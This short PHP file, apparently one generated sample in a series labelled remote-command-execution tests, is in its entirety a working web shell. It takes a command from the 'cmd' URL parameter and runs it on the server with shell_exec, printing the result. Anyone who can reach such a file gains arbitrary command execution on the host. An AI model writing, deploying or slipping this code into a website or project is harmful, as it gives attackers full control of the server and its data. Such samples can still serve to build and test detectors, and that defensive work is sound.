<?php
// RCE test variation #887
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>